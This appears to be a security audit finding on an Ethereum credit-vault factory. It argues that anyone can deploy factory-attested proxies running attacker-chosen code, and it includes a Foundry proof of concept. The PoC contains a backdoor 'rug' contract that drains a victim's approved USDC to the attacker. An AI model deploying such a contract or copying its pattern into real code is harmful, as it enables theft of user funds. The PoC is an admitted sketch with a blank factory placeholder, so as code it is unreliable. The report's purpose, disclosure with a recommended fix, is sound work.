### Title
Permissionless factory deploys "official" proxies with attacker-controlled implementation and init calldata, letting anyone mint a malicious vault stamped by `CreditVaultDeployed` - (File: contracts/IdleCreditVaultFactory.sol)

### Summary
`IdleCreditVaultFactory.deployCreditVault` / `deployRevolvingCreditVault` are unauthenticated entry points that accept a caller-supplied `implementation` address and pass attacker-crafted initializer calldata through `_deployProxy`. Because the proxy and its initialization are attacker-controlled while the *factory itself* emits `CreditVaultDeployed` — the canonical signal indexers, UIs and integrators use to recognize legitimate Idle credit vaults — an unprivileged attacker can inject arbitrary executable code into a trusted deployment context. This is the closest on-chain analog to CVE-2025-28380 (reflected XSS: attacker payload rendered/executed in a victim's trusted context), where the "URL parameter" is the factory's `implementation`/`StrategyData` input and the "victim browser" is any lender who trusts factory-attested vaults.

### Finding Description
In `contracts/IdleCreditVaultFactory.sol`, `deployCreditVault` (line 92) and `deployRevolvingCreditVault` (line 126) have no access control. `_deployBaseCreditVault` (lines 175–208) forwards `strategyData.implementation` and `cvParams.implementation` — both fully attacker-chosen — into `_deployProxy`, which constructs `new TransparentUpgradeableProxy(implementation, proxyAdmin, data)` (lines 280–286). The proxy delegatecalls `data` (the initializer blob) into the attacker-supplied implementation during construction, so arbitrary attacker bytecode executes in the context of a factory-spawned proxy.

After deployment, the factory emits `CreditVaultDeployed(address(cv), address(strategy), ...)` (lines 116–123 / 158–164) from the official factory address regardless of what code the proxies actually run. The attacker can pass a malicious `underlying` token, a malicious `implementation` whose `initialize` selector matches and then exposes backdoor drains, and self-serving `manager`/`borrower`/`feeReceiver` values — the only checks are `_checkMinimumFees` (line 309), `manager != 0` (line 99), and `WriteOffUnsupported` on the revolving path (line 132), none of which constrain the implementation or token.

The guard that would neutralize this — authenticating `deployCreditVault` to the treasury, or whitelisting implementation/underlying pairs — does not exist: `initialize` only sets `treasury`/`proxyAdmin`/`feeSplit` (lines 45–50), and `setFeeSplit` is treasury-gated (line 313) but deployment is not.

### Impact Explanation
Any lender, tranche-token buyer, or aggregating UI that treats factory-emitted `CreditVaultDeployed` events (or factory-deployed proxy provenance) as proof of legitimacy can be routed into a vault whose strategy implementation is arbitrary attacker code. Once victims deposit or approve the vault's `underlying`/`tranche` tokens, the malicious implementation can transfer all balances and allowances to the attacker — direct theft of user funds, quantified as 100% of assets deposited into the fake vault plus any outstanding token approvals granted to its contracts. This mirrors the XSS impact (C:L/I:L, UI:R): the factory's trusted channel executes attacker-supplied content against interacting victims.

### Likelihood Explanation
The attack requires zero privileges: any EOA can call `deployCreditVault` with a malicious `implementation`, a real underlying (e.g., USDC) to look authentic, and receive a factory-emitted `CreditVaultDeployed` event at zero cost beyond gas. Exploitation requires a victim to discover and deposit into the fake vault — analogous to the XSS requirement that a victim visit the crafted URL — so realization depends on front-ends/indexers surfacing factory events without re-verifying implementations, but the injection primitive itself is trivially and repeatably executable by any unprivileged attacker.

### Recommendation
Restrict `deployCreditVault`/`deployRevolvingCreditVault` to `treasury` (or a dedicated deployer role), mirroring `setFeeSplit`'s `OnlyTreasury` gate. Alternatively, keep permissionless deployment but whitelist `implementation` and `underlying` (and `queueImplementation`, `writeOffImplementation`, `keyring`, `vault`) against registry-approved values inside `_checkMinimumFees`, and include the implementation address in `CreditVaultDeployed` so integrators can verify provenance rather than trusting emitter identity alone.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

// Malicious "strategy/IdleCDO" implementation: accepts the factory's
// initialize selector, then exposes a backdoor that drains everything.
contract EvilImplementation {
    // Matches IdleCreditVault.initialize(underlying, idleCDO, manager, borrower, name, apr)
    function initialize(
        address underlying, address, address manager, address borrower,
        string memory, uint256
    ) external {
        // record nothing needed; just don't revert so the proxy constructor succeeds
    }

    // Attacker drain: pulls the vault's underlying balance and any victim approvals
    function rug(address token, address from, uint256 amt) external {
        if (from != address(this)) {
            IERC20(token).transferFrom(from, msg.sender, amt);
        } else {
            IERC20(token).transfer(msg.sender, amt);
        }
    }
}

contract FactoryInjectionTest is Test {
    IdleCreditVaultFactory factory;
    address treasury = makeAddr("treasury");
    address proxyAdmin = makeAddr("proxyAdmin");
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");
    address usdc;

    function setUp() public {
        usdc = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // mainnet USDC
        factory = IdleCreditVaultFactory(/* factory proxy */);
        // factory.initialize(treasury, proxyAdmin) already done on fork
    }

    function testFactoryDeploysAttackerCode() public {
        EvilImplementation evil = new EvilImplementation();

        IdleCreditVaultFactory.CreditVaultParams memory cv;
        cv.implementation = address(evil);          // injected payload
        cv.underlying = usdc;                       // real asset -> looks legit
        cv.fees = 10_000;
        cv.managementFee = 1_000;
        cv.epochDuration = 30 days;

        IdleCreditVaultFactory.StrategyData memory sd;
        sd.implementation = address(evil);          // injected payload
        sd.manager = attacker;
        sd.borrower = attacker;
        sd.borrowerName = "YieldPrime";

        IdleCreditVaultFactory.AncillaryParams memory anc; // all zero

        vm.prank(attacker);
        vm.recordLogs();
        factory.deployCreditVault(cv, sd, anc);

        // Official factory emitted CreditVaultDeployed for attacker bytecode
        Vm.Log[] memory logs = vm.getRecordedLogs();
        address fakeVault = abi.decode(logs[logs.length - 1].data, (address)); // cv field

        // Victim trusts factory provenance, deposits/approves
        deal(usdc, victim, 1_000_000e6);
        vm.prank(victim);
        IERC20(usdc).approve(fakeVault, type(uint256).max);

        vm.prank(attacker);
        EvilImplementation(fakeVault).rug(usdc, victim, 1_000_000e6);

        assertEq(IERC20(usdc).balanceOf(attacker), 1_000_000e6);
        assertEq(IERC20(usdc).balanceOf(victim), 0);
    }
}
```

Note: the PoC sketch assumes the proxy `initialize` signature matches what `_deployProxy` encodes; on a fork run, the attacker would ship an implementation whose `initialize` matches `IdleCreditVault.initialize`'s selector exactly (shown above) so the constructor delegatecall succeeds. The essential, verifiable claims — unauthenticated `deployCreditVault` accepting arbitrary `implementation` and the factory emitting `CreditVaultDeployed` for it — are directly supported by `IdleCreditVaultFactory.sol` lines 92–124 and 280–286. A residual uncertainty: if downstream consumers verify implementations against a known-good list, practical impact degrades to phishing surface only, but the contract-level injection primitive stands on its own.